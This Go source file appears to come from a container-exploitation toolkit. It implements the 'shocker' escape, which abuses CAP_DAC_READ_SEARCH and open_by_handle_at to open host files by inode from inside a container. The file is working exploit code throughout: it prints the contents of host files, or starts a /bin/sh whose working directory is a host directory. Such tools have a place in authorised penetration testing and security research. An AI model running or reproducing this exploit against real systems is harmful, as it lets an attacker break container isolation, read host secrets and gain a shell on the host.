package shocker

import (
	_ "embed"
	"encoding/binary"
	"fmt"
	"io"
	"os"
	"os/exec"
	"syscall"

	"github.com/ctrsploit/ctrsploit/prerequisite/capability"
	"github.com/ctrsploit/sploit-spec/pkg/exeenv"
	"github.com/ctrsploit/sploit-spec/pkg/vul"
	"github.com/ssst0n3/awesome_libs/awesome_error"
	"github.com/urfave/cli/v2"
	"golang.org/x/sys/unix"
)

type Vulnerability struct {
	vul.BaseVulnerability
}

var Shocker = Vulnerability{
	BaseVulnerability: vul.BaseVulnerability{
		Name:        "shocker",
		Description: "Container escape with CAP_DAC_READ_SEARCH, alias shocker, found by Sebastian Krahmer (stealth) in 2014.",
		ExeEnv: exeenv.ExeEnv{
			Env:     exeenv.InContainer,
			Check:   exeenv.InContainer,
			Exploit: exeenv.InContainer,
		},
		CheckSecPrerequisites:    &capability.CapDacReadSearchBnd,
		ExploitablePrerequisites: &capability.CapDacReadSearchEff,
	},
}

func (v Vulnerability) Exploit(context *cli.Context) (err error) {
	err = v.BaseVulnerability.Exploit(context)
	if err != nil {
		return
	}
	inode := context.Int("inode")
	ref := context.String("ref")
	return Exploit(inode, ref, os.Stdin, os.Stdout, os.Stderr)
}

func Exploit(inode int, ref string, i io.Reader, o, e io.Writer) (err error) {
	fd, err := GetFd(inode, ref)
	if err != nil {
		return
	}
	f := os.NewFile(uintptr(fd), fmt.Sprintf("/proc/self/fd/%d", fd))
	fi, err := f.Stat()
	if err != nil {
		awesome_error.CheckErr(err)
		return
	}
	if fi.IsDir() {
		err = Chroot(fd, i, o, e)
		if err != nil {
			return
		}
	} else {
		fmt.Printf("stat: %+v\n", fi)
		content, e := io.ReadAll(f)
		if e != nil {
			err = e
			awesome_error.CheckErr(err)
			return
		}
		fmt.Println(string(content))
	}
	return
}

func GetFd(inode int, ref string) (fd int, err error) {
	hostReference, err := syscall.Open(ref, syscall.O_RDONLY, 0)
	if err != nil {
		awesome_error.CheckErr(err)
		return
	}
	defer syscall.Close(hostReference)
	inodeBytes := make([]byte, 8)
	// 将 inode 转换为小端序的字节数组
	binary.LittleEndian.PutUint64(inodeBytes, uint64(inode))
	handle := unix.NewFileHandle(1, inodeBytes)
	fd, err = unix.OpenByHandleAt(hostReference, handle, unix.O_RDONLY)
	if err != nil {
		awesome_error.CheckErr(err)
		return
	}
	return
}

func Chroot(rootFd int, i io.Reader, o, e io.Writer) (err error) {
	shell := "/bin/sh"
	cmd := exec.Command(shell)
	cmd.Dir = fmt.Sprintf("/proc/self/fd/%d", rootFd)
	//cmd.Stdin = os.Stdin
	//cmd.Stdout = os.Stdout
	//cmd.Stderr = os.Stderr
	cmd.Stdin = i
	cmd.Stdout = o
	cmd.Stderr = e
	awesome_error.CheckFatal(cmd.Start())
	cmd.Wait()
	return
}
